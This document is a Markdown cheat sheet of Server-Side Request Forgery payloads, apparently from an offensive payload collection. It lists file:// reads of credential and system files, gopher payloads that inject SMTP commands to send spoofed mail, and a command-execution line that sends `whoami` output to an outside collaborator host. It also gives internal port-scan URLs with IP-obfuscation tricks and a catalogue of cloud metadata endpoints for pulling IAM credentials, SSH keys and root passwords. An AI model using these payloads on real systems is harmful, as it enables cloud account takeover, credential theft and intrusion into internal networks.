# Extract metadata, XSS, XSPA, RCE & LFI with SSRF (Server-Side Request Forgery)

# LFI (Local File Inclusion)

* `file:///etc/passwd`
* `file:///c:/windows/win.ini`
* `dict://<server>:11111/`
* `sftp://<server>:11111/`
* `tftp://<server>:12346/TESTUDPPACKET`
* `ftp://<server>:12346/TESTUDPPACKET`
* `ldap://localhost:11211/%0astats%0aquit`
* `gopher://<server>:8080/_GET / HTTP/1.0%0A%0A`
* `gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body`
* `gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a`
  

Will make a request like :

```
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400

Subject: Ah Ah Ah

You didn't say the magic word !


.
QUIT
```
# RCE (Remote Code Execution)

* http://yourserver.burpcollaborator.net?`whoami`
  
# XSPA (Cross Site Port Attack, Internal Port Scan)

* `http://localhost:<port>`
* `http://127.0.0.1:<port>`
* `http://192.168.0.1:<port>`
* `http://0177.0.0.1:<port>`
* `http://2130706433:<port>`
* `http://3232235521:<port>`
* `http://3232235777:<port>`

# XSS (Cross-Site Scripting)

* `http://<yourxsshunter>.xss.ht`
  
# Cloud metadata
  
# AWS
From http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories

* http://169.254.169.254/latest/user-data
* http://169.254.169.254/latest/user-data/iam/security-credentials/ > return the ROLE-NAME
* http://169.254.169.254/latest/meta-data/iam/security-credentials/ > return the ROLE-NAME
* http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE-NAME]
* http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
* http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
* http://169.254.169.254/latest/meta-data/ami-id
* http://169.254.169.254/latest/meta-data/reservation-id
* http://169.254.169.254/latest/meta-data/hostname
* http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
* http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
* http://169.254.170.2/v2/credentials/[UID]

### ECS Task
From https://docs.aws.amazon.com/AmazonECS/latest/developerguide/task-metadata-endpoint-v2.html

* http://169.254.170.2/v2/credentials/

### Other notations

* http://2852039166/latest/user-data
* http://169.254.43518/latest/user-data
* http://169.16689662/latest/user-data
* http://0xa9fea9fe/latest/user-data

### Shortners

* https://bit.ly/3pLoO2s
* https://bit.ly/3EnV0gh

### IPv6 

* http://[::ffff:169.254.169.254]
* http://[0:0:0:0:0:ffff:169.254.169.254]

# AWS - Dirs 

* http://169.254.169.254/
* http://169.254.169.254/latest/meta-data/
* http://169.254.169.254/latest/meta-data/public-keys/

## IMDSv2

If you can make PUT request :

PUT request to http://169.254.169.254/latest/api/token with the custom header `x-aws-ec2-metadata-token-ttl-seconds` with the value of the number of seconds for which the token needs to be active. Put the extracted token to the header `x-aws-ec2-metadata-token` and try the requests above.


# Google Cloud
From https://cloud.google.com/compute/docs/metadata

###  Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"

* http://169.254.169.254/computeMetadata/v1/
* http://metadata.google.internal/computeMetadata/v1/
* http://metadata/computeMetadata/v1/
* http://metadata.google.internal/computeMetadata/v1/instance/hostname
* http://metadata.google.internal/computeMetadata/v1/instance/id
* http://metadata.google.internal/computeMetadata/v1/project/project-id
* http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env

## Google allows recursive pulls 

* http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

###  Beta does NOT require a header atm

* http://metadata.google.internal/computeMetadata/v1beta1/
* http://metadata/computeMetadata/v1beta2/instance/attributes/dataproc-role?alt=json
* http://metadata/computeMetadata/v1beta2/project/attributes/ssh-keys?alt=json

### Returns root password for Google

* http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/?recursive=true&alt=json

# Digital Ocean
From https://developers.digitalocean.com/documentation/metadata/

* http://169.254.169.254/metadata/v1.json
* http://169.254.169.254/metadata/v1/ 
* http://169.254.169.254/metadata/v1/id
* http://169.254.169.254/metadata/v1/user-data
* http://169.254.169.254/metadata/v1/hostname
* http://169.254.169.254/metadata/v1/region
* http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address

# Packetcloud

https://metadata.packet.net/userdata

# Azure
From https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service

From https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

## Requires the header "Metadata: true"

* http://169.254.169.254/metadata/v1/maintenance
* http://169.254.169.254/metadata/instance?api-version=2017-04-02
* http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text

# OpenStack/RackSpace 
From https://docs.openstack.org/nova/latest/user/metadata-service.html

* http://169.254.169.254/openstack
* http://169.254.169.254/openstack/2012-08-10/meta_data.json
* http://169.254.169.254/openstack/2018-08-27/network_data.json

# HP Helion 

* http://169.254.169.254/2009-04-04/meta-data/ 

# Oracle Cloud
From https://docs.oracle.com/en/cloud/iaas/compute-iaas-cloud/stcsg/retrieving-instance-metadata.html

From https://docs.us-phoenix-1.oraclecloud.com/Content/Compute/Tasks/gettingmetadata.htm

* http://169.254.169.254/opc/v1/instance/
* http://192.0.0.192/latest/
* http://192.0.0.192/latest/user-data/
* http://192.0.0.192/latest/meta-data/
* http://192.0.0.192/latest/attributes/

# Alibaba
From https://www.alibabacloud.com/help/faq-detail/49122.htm

* http://100.100.100.200/latest/meta-data/
* http://100.100.100.200/latest/meta-data/instance-id
* http://100.100.100.200/latest/meta-data/image-id

# Tencent Cloud
From https://intl.cloud.tencent.com/document/product/213/4934

* http://100.88.222.5
* http://metadata.tencentyun.com/
* http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/[ROLE-NAME]
* http://metadata.tencentyun.com/latest/meta-data/
* http://metadata.tencentyun.com/latest/meta-data/instance-id
* http://metadata.tencentyun.com/latest/meta-data/uuid

# Kubernetes
From https://kubernetes.io/docs/tasks/debug-application-cluster/debug-service

* https://kubernetes.default.svc.cluster.local
* https://kubernetes.default
* https://kubernetes.default.svc/metrics
